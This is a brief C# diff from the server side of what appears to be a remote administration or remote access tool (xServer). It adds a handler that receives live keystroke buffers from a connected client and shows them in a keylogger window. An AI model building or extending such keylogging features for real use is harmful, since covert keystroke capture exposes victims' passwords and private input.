@@ -166,6 +166,14 @@ namespace xServer.Core.Commands
             }
         }
 
+        public static void HandleGetKeyloggerLiveResponse(Client client, GetKeyloggerLiveResponse packet)
+        {
+            if (client.Value == null || client.Value.FrmKl == null)
+                return;
+
+            client.Value.FrmKl.AppendLiveResponse(packet.Buffer);
+        }
+
         public static void HandleGetMonitorsResponse(Client client, GetMonitorsResponse packet)
         {
             if (client.Value == null || client.Value.FrmRdp == null)
